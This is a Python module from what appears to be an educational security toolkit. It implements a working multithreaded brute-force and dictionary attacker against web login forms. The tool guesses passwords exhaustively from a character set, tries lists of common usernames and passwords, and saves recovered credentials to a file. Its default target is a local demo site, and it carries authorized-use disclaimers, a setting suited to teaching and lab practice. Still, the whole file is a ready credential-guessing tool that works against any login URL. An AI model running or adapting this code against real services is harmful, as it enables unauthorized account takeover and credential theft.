#!/usr/bin/env python3
"""
Web-based Brute Force Attack Interface
Educational Cybersecurity Toolkit - For authorized educational use only

This module provides a web interface for conducting brute force attacks
against the demo vulnerable website using the password toolkit.

Author: Aniket886
GitHub: https://github.com/Aniket886
Project: Educational Cybersecurity Toolkit
Created: 2025

WARNING: This tool is for educational purposes only. Only use against
systems you own or have explicit permission to test.
"""

import sys
import os
import requests
import threading
import time
import json
from datetime import datetime
from typing import List, Dict, Optional, Callable
from queue import Queue
import itertools
import string

# Add src directory to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'src'))

from brute_force import BruteForceAttacker
from dictionary_attack import DictionaryAttacker


class WebBruteForceAttacker:
    """
    Web-based brute force attack implementation.
    Targets web login forms using HTTP requests.
    """
    
    def __init__(self, target_url: str = "http://localhost:5000/login", max_threads: int = 5):
        """
        Initialize web brute force attacker.
        
        Args:
            target_url: Target login endpoint URL
            max_threads: Maximum number of concurrent threads
        """
        self.target_url = target_url
        self.max_threads = min(max_threads, 10)  # Safety limit
        self.session = requests.Session()
        self.attempts = 0
        self.successful_logins = []
        self.failed_attempts = []
        self.start_time = None
        self.stop_attack = False
        self.lock = threading.Lock()
        self.progress_callback = None
        self.rate_limit = 0.1  # Delay between requests (seconds)
        
        # Attack statistics
        self.stats = {
            'total_attempts': 0,
            'successful_logins': 0,
            'failed_attempts': 0,
            'start_time': None,
            'end_time': None,
            'duration': 0,
            'rate_per_second': 0
        }
        
        self._display_security_notice()
    
    def _display_security_notice(self):
        """Display educational use disclaimer."""
        print("=" * 70)
        print("WEB BRUTE FORCE ATTACK MODULE")
        print("EDUCATIONAL PURPOSE ONLY - AUTHORIZED USE REQUIRED")
        print("Only use against systems you own or have permission to test")
        print("=" * 70)
    
    def set_progress_callback(self, callback: Callable):
        """Set callback function for progress updates."""
        self.progress_callback = callback
    
    def set_rate_limit(self, delay: float):
        """Set delay between requests in seconds."""
        self.rate_limit = max(0.01, delay)  # Minimum 10ms delay
    
    def test_connection(self) -> bool:
        """Test connection to target URL."""
        try:
            response = self.session.get(self.target_url.replace('/login', '/'))
            return response.status_code == 200
        except Exception as e:
            print(f"Connection test failed: {e}")
            return False
    
    def attempt_login(self, username: str, password: str) -> Dict:
        """
        Attempt login with given credentials.
        
        Args:
            username: Username to try
            password: Password to try
            
        Returns:
            Dictionary with attempt result
        """
        try:
            data = {
                'username': username,
                'password': password
            }
            
            response = self.session.post(
                self.target_url,
                data=data,
                timeout=10,
                allow_redirects=False
            )
            
            # Parse JSON response
            try:
                result = response.json()
                success = result.get('success', False)
            except:
                # Fallback: check status code and response content
                success = response.status_code == 200 and 'success' in response.text.lower()
                result = {'success': success, 'message': 'Response parsing failed'}
            
            attempt_result = {
                'username': username,
                'password': password,
                'success': success,
                'status_code': response.status_code,
                'response': result,
                'timestamp': datetime.now().isoformat()
            }
            
            with self.lock:
                self.attempts += 1
                self.stats['total_attempts'] += 1
                
                if success:
                    self.successful_logins.append(attempt_result)
                    self.stats['successful_logins'] += 1
                    print(f"\n✓ SUCCESS: {username}:{password}")
                else:
                    self.failed_attempts.append(attempt_result)
                    self.stats['failed_attempts'] += 1
                
                # Call progress callback if set
                if self.progress_callback:
                    self.progress_callback(attempt_result, self.stats)
            
            return attempt_result
            
        except Exception as e:
            error_result = {
                'username': username,
                'password': password,
                'success': False,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            }
            
            with self.lock:
                self.attempts += 1
                self.failed_attempts.append(error_result)
                self.stats['total_attempts'] += 1
                self.stats['failed_attempts'] += 1
            
            return error_result
    
    def dictionary_attack(self, usernames: List[str], passwords: List[str]) -> List[Dict]:
        """
        Perform dictionary attack with given usernames and passwords.
        
        Args:
            usernames: List of usernames to try
            passwords: List of passwords to try
            
        Returns:
            List of successful login attempts
        """
        print(f"\nStarting dictionary attack...")
        print(f"Usernames: {len(usernames)}")
        print(f"Passwords: {len(passwords)}")
        print(f"Total combinations: {len(usernames) * len(passwords)}")
        print(f"Target: {self.target_url}")
        print(f"Rate limit: {self.rate_limit}s between requests")
        print("-" * 50)
        
        self.start_time = time.time()
        self.stats['start_time'] = datetime.now().isoformat()
        self.stop_attack = False
        
        # Create all combinations
        combinations = [(u, p) for u in usernames for p in passwords]
        
        def worker():
            while not self.stop_attack:
                try:
                    username, password = combinations.pop(0)
                    self.attempt_login(username, password)
                    time.sleep(self.rate_limit)
                except IndexError:
                    break  # No more combinations
                except Exception as e:
                    print(f"Worker error: {e}")
        
        # Start worker threads
        threads = []
        for i in range(min(self.max_threads, len(combinations))):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        self._finalize_stats()
        return self.successful_logins
    
    def brute_force_attack(self, usernames: List[str], charset: str = None, 
                          min_length: int = 1, max_length: int = 4) -> List[Dict]:
        """
        Perform brute force attack generating passwords systematically.
        
        Args:
            usernames: List of usernames to try
            charset: Character set for password generation
            min_length: Minimum password length
            max_length: Maximum password length
            
        Returns:
            List of successful login attempts
        """
        if charset is None:
            charset = string.ascii_lowercase + string.digits
        
        # Calculate total combinations
        total_passwords = sum(len(charset) ** length for length in range(min_length, max_length + 1))
        total_combinations = len(usernames) * total_passwords
        
        print(f"\nStarting brute force attack...")
        print(f"Usernames: {len(usernames)}")
        print(f"Character set: {charset}")
        print(f"Password length: {min_length}-{max_length}")
        print(f"Total password combinations: {total_passwords:,}")
        print(f"Total login combinations: {total_combinations:,}")
        print(f"Target: {self.target_url}")
        print(f"Rate limit: {self.rate_limit}s between requests")
        print("-" * 50)
        
        self.start_time = time.time()
        self.stats['start_time'] = datetime.now().isoformat()
        self.stop_attack = False
        
        # Generate passwords
        def generate_passwords():
            for length in range(min_length, max_length + 1):
                for password_tuple in itertools.product(charset, repeat=length):
                    if self.stop_attack:
                        return
                    yield ''.join(password_tuple)
        
        # Create queue for combinations
        queue = Queue()
        
        # Fill queue with combinations
        def fill_queue():
            for username in usernames:
                for password in generate_passwords():
                    if self.stop_attack:
                        return
                    queue.put((username, password))
        
        # Start queue filler thread
        filler_thread = threading.Thread(target=fill_queue)
        filler_thread.daemon = True
        filler_thread.start()
        
        def worker():
            while not self.stop_attack:
                try:
                    username, password = queue.get(timeout=1)
                    self.attempt_login(username, password)
                    time.sleep(self.rate_limit)
                    queue.task_done()
                except:
                    break  # Queue empty or timeout
        
        # Start worker threads
        threads = []
        for i in range(self.max_threads):
            thread = threading.Thread(target=worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for completion or stop signal
        try:
            filler_thread.join()
            queue.join()
        except KeyboardInterrupt:
            print("\nAttack interrupted by user")
            self.stop_attack = True
        
        self._finalize_stats()
        return self.successful_logins
    
    def smart_attack(self, target_username: str = None) -> List[Dict]:
        """
        Perform smart attack using common usernames and passwords.
        
        Args:
            target_username: Specific username to target (optional)
            
        Returns:
            List of successful login attempts
        """
        # Common usernames
        common_usernames = [
            'admin', 'administrator', 'user', 'test', 'demo', 'guest',
            'root', 'manager', 'operator', 'service', 'support',
            'john', 'alice', 'bob', 'charlie', 'david', 'eve'
        ]
        
        # Common passwords
        common_passwords = [
            'password', '123456', 'admin', 'test', 'demo', 'guest',
            'root', 'manager', 'qwerty', 'letmein', 'welcome',
            'password123', 'admin123', 'test123', '12345678',
            'abc123', '111111', '000000', 'login', 'pass'
        ]
        
        # Use specific username if provided
        if target_username:
            usernames = [target_username]
            # Add username-based passwords
            username_passwords = [
                target_username,
                target_username + '123',
                target_username + '1',
                target_username + '2025',
                '123' + target_username
            ]
            passwords = list(set(common_passwords + username_passwords))
        else:
            usernames = common_usernames
            passwords = common_passwords
        
        return self.dictionary_attack(usernames, passwords)
    
    def stop(self):
        """Stop the current attack."""
        self.stop_attack = True
        print("\nStopping attack...")
    
    def _finalize_stats(self):
        """Finalize attack statistics."""
        end_time = time.time()
        self.stats['end_time'] = datetime.now().isoformat()
        self.stats['duration'] = end_time - self.start_time
        
        if self.stats['duration'] > 0:
            self.stats['rate_per_second'] = self.stats['total_attempts'] / self.stats['duration']
        
        print(f"\n" + "=" * 50)
        print("ATTACK COMPLETED")
        print("=" * 50)
        print(f"Total attempts: {self.stats['total_attempts']}")
        print(f"Successful logins: {self.stats['successful_logins']}")
        print(f"Failed attempts: {self.stats['failed_attempts']}")
        print(f"Duration: {self.stats['duration']:.2f} seconds")
        print(f"Rate: {self.stats['rate_per_second']:.2f} attempts/second")
        
        if self.successful_logins:
            print(f"\n✓ SUCCESSFUL CREDENTIALS:")
            for login in self.successful_logins:
                print(f"  {login['username']}:{login['password']}")
    
    def save_results(self, filename: str = None):
        """Save attack results to JSON file."""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"web_attack_results_{timestamp}.json"
        
        results = {
            'attack_info': {
                'target_url': self.target_url,
                'max_threads': self.max_threads,
                'rate_limit': self.rate_limit
            },
            'statistics': self.stats,
            'successful_logins': self.successful_logins,
            'failed_attempts': self.failed_attempts[-100:]  # Last 100 failures
        }
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"Results saved to: {filename}")


def main():
    """Main function for command-line usage."""
    print("Web Brute Force Attack Tool")
    print("Educational Cybersecurity Toolkit")
    print("=" * 50)
    
    # Default target (demo website)
    target_url = "http://localhost:5000/login"
    
    # Test connection
    attacker = WebBruteForceAttacker(target_url)
    
    if not attacker.test_connection():
        print("❌ Cannot connect to target. Make sure the demo website is running.")
        print("Run: python demo/app.py")
        return
    
    print("✓ Connection to target successful")
    
    # Progress callback
    def progress_callback(attempt, stats):
        if stats['total_attempts'] % 10 == 0:
            print(f"Progress: {stats['total_attempts']} attempts, "
                  f"{stats['successful_logins']} successful")
    
    attacker.set_progress_callback(progress_callback)
    attacker.set_rate_limit(0.1)  # 100ms between requests
    
    # Perform smart attack
    print("\nStarting smart attack with common credentials...")
    results = attacker.smart_attack()
    
    # Save results
    attacker.save_results()
    
    if results:
        print(f"\n🎯 Attack successful! Found {len(results)} valid credentials.")
    else:
        print("\n❌ No valid credentials found.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nAttack interrupted by user.")
    except Exception as e:
        print(f"\nError: {e}")